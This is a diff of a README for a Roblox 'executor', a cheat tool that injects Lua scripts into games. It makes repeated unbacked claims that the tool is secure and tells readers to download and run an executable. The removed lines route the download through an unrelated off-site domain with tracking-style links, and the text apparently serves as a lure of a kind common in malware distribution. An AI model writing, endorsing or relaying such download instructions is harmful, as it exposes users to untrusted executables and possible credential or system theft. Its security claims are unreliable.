@@ -1,83 +1,78 @@
-# 🚀 Roblox Best Executor 2025
+# Roblox Best Executor 2025
 
-![Roblox Executor](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen?style=for-the-badge&logo=github)
+![Roblox Executor](https://img.shields.io/badge/Download-Executor-blue.svg)
 
-Welcome to the **Roblox Best Executor 2025** repository! This project aims to provide a fast, secure, and powerful Lua script executor for Roblox. Designed for maximum compatibility and ease of use, it supports advanced features, script injection, and a sleek user interface for smooth in-game enhancements.
+Welcome to the **Roblox Best Executor 2025** repository! This project offers a powerful and secure Lua script executor designed specifically for Roblox. With a focus on performance and user experience, this executor enables you to enhance your gaming experience with ease.
 
 ## Table of Contents
 
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
-- [Supported Scripts](#supported-scripts)
+- [Compatibility](#compatibility)
+- [Advanced Features](#advanced-features)
+- [Support](#support)
 - [Contributing](#contributing)
 - [License](#license)
-- [Contact](#contact)
 
 ## Features
 
-- **Fast Execution**: Enjoy rapid script execution to enhance your gaming experience without delays.
-- **Secure Environment**: Our executor ensures your scripts run safely, minimizing risks.
-- **Powerful Lua Support**: Execute complex Lua scripts with ease.
-- **User-Friendly Interface**: Navigate effortlessly with a sleek and intuitive UI.
-- **Compatibility**: Works seamlessly with various Roblox games, including popular titles.
-- **Script Injection**: Inject scripts into games smoothly for enhanced functionality.
+- **Fast Execution**: Experience quick script execution for seamless gameplay.
+- **Secure Environment**: Enjoy a safe environment for running your scripts without worries.
+- **User-Friendly Interface**: Navigate easily with a sleek and intuitive UI.
+- **Script Injection**: Inject Lua scripts effortlessly into your Roblox games.
+- **Max Compatibility**: Works well with a wide range of Roblox games and scripts.
 
 ## Installation
 
-To get started with **Roblox Best Executor 2025**, follow these steps:
+To get started, download the latest version of the executor from the [Releases](https://github.com/kuba1ricci/Roblox-Best-Executor-2025/releases) section. Once downloaded, follow these steps:
 
-1. Visit the [Releases section](https://gitzinstall.icu?td69vz8rlwp12yg).
-2. Download the latest version of the executor.
-3. Extract the files to your preferred location on your PC.
-4. Run the executable file to launch the executor.
-
-Make sure to check the [Releases section](https://gitzinstall.icu?5njmyt0ktm881wl) for updates and new features.
+1. Extract the downloaded ZIP file.
+2. Run the `RobloxBestExecutor.exe` file.
+3. Follow the on-screen instructions to complete the setup.
 
 ## Usage
 
-Using the **Roblox Best Executor 2025** is straightforward:
+Using the executor is straightforward. After installation, follow these steps:
 
-1. Launch the executor.
-2. Open Roblox and navigate to the game you want to enhance.
-3. Copy your Lua script.
+1. Launch the Roblox game you want to enhance.
+2. Open the **Roblox Best Executor 2025** application.
+3. Copy your desired Lua script.
 4. Paste the script into the executor's input field.
-5. Click the "Execute" button.
+5. Click the **Execute** button to run the script.
 
-Enjoy the enhanced gaming experience as your script runs!
+For a detailed guide, please refer to the documentation provided in the repository.
 
-## Supported Scripts
+## Compatibility
 
-The executor supports a variety of scripts, including:
+The **Roblox Best Executor 2025** is designed to work with a wide variety of Roblox games. It supports:
 
-- **Blox Fruits Scripts**: Enhance your gameplay in Blox Fruits with powerful scripts.
-- **Discord Scripts**: Integrate Discord features into your Roblox experience.
-- **Fisch Scripts**: Use advanced scripts tailored for specific games.
-- **Fluxus Scripts**: Take advantage of Fluxus features for enhanced performance.
+- Delta Exploits
+- Luna Scripts
+- Various Lua scripts from the community
+
+If you encounter any compatibility issues, check the **Issues** section of the repository for solutions or report your problem.
+
+## Advanced Features
+
+The executor comes with several advanced features to enhance your experience:
+
+- **Script Library**: Access a collection of popular scripts directly within the executor.
+- **Custom Scripts**: Create and save your own scripts for future use.
+- **Debugging Tools**: Use built-in tools to troubleshoot and optimize your scripts.
+
+## Support
+
+If you need assistance, please check the **Issues** section of this repository. You can also reach out through the community forums or Discord for real-time help.
 
 ## Contributing
 
-We welcome contributions from the community! If you want to help improve **Roblox Best Executor 2025**, please follow these steps:
-
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them.
-4. Push your changes to your fork.
-5. Submit a pull request.
-
-Your contributions help make this project better for everyone!
+We welcome contributions to improve the **Roblox Best Executor 2025**. If you have ideas or fixes, please fork the repository and submit a pull request. Ensure that your code adheres to our coding standards and includes relevant tests.
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
-
-## Contact
-
-For questions or feedback, feel free to reach out:
-
-- **Email**: support@robloxbestexecutor2025.com
-- **Discord**: Join our community on Discord [here](https://discord.gg/your-discord-link).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ---
 
-Thank you for checking out **Roblox Best Executor 2025**! We hope you enjoy using it as much as we enjoyed building it. Happy gaming!
+For the latest updates and releases, visit the [Releases](https://github.com/kuba1ricci/Roblox-Best-Executor-2025/releases) section. Enjoy your enhanced Roblox experience!
